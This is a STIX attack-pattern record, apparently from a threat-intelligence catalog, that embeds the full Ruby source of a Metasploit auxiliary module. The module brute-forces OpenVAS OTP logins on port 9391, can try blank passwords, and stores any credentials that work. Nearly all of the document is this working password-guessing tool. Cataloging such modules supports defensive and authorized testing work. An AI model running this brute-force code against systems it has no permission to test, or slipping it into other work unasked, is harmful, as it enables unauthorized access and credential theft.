{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57a75533-95f3-4de5-b2b9-3447be8294b4",
    "created": "2024-08-14T16:31:13.638915Z",
    "modified": "2024-08-14T16:31:13.638919Z",
    "name": "OpenVAS OTP Login Utility",
    "description": "This module attempts to authenticate to an OpenVAS OTP service.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/openvas/openvas_otp_login.rb",
            "external_id": "openvas_otp_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name'        => 'OpenVAS OTP Login Utility',\n      'Description' => 'This module attempts to authenticate to an OpenVAS OTP service.',\n      'Author'      => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],\n      'License'     => MSF_LICENSE\n    )\n    register_options(\n      [\n        Opt::RPORT(9391),\n        OptBool.new('BLANK_PASSWORDS', [false, \"Try blank passwords for all users\", false])\n      ]\n    )\n  end\n\n  def run_host(ip)\n    begin\n      print_status(\"#{msg} Connecting and checking username and passwords\")\n      each_user_pass do |user, pass|\n        do_login(user, pass)\n      end\n    rescue ::Rex::ConnectionError\n    rescue ::Exception => e\n      vprint_error(\"#{msg} #{e.to_s} #{e.backtrace}\")\n    end\n  end\n\n  def otp_send(data=nil, con=true)\n    begin\n      @result=''\n      @coderesult=''\n      if (con)\n        @connected=false\n        connect\n        select(nil,nil,nil,0.4)\n      end\n      @connected=true\n      sock.put(data)\n      @result=sock.get_once\n    rescue ::Exception => err\n      print_error(\"#{msg} Error: #{err.to_s}\")\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def do_login(user=nil,pass=nil)\n    begin\n      otp_send(\"< OTP/1.0 >\\n\",true) # send hello\n      if @result !~ /\\<\\ OTP\\/1\\.0 \\>/\n        print_error(\"#{msg} OpenVAS OTP does not appear to be running: did not get response to OTP hello: #{@result}\")\n        return :abort\n      end\n\n      vprint_status(\"#{msg} Trying user:'#{user}' with password:'#{pass}'\")\n      otp_send(nil,!@connected)\n      if @result !~ /User\\ \\:/\n        print_error(\"#{msg} OpenVAS OTP did not send User request: #{@result}\")\n      end\n      otp_send(\"#{user}\\n\",!@connected)\n      if @result !~ /Password\\ \\:/\n        print_error(\"#{msg} OpenVAS OTP did not send Password request: #{@result}\")\n      end\n      otp_send(\"#{pass}\\n\",!@connected)\n      if @result =~ /SERVER <|>.*<|> SERVER/is\n        print_good(\"#{msg} SUCCESSFUL login for '#{user}' : '#{pass}'\")\n        report_cred(\n          ip: rhost,\n          port: rport,\n          service_name: 'openvas-otp',\n          user: user,\n          password: pass,\n          proof: @result\n        )\n        disconnect\n        @connected = false\n        return :next_user\n      else\n        if (@connected)\n          disconnect # Sometime openvas disconnect the client after wrongs attempts\n          @connected = false\n        end\n        vprint_error(\"#{msg} Rejected user: '#{user}' with password: '#{pass}': #{@result}\")\n        return :fail\n      end\n      rescue ::Rex::ConnectionError\n      rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\n\n  def msg\n    \"#{rhost}:#{rport} OpenVAS OTP -\"\n  end\nend\n"
}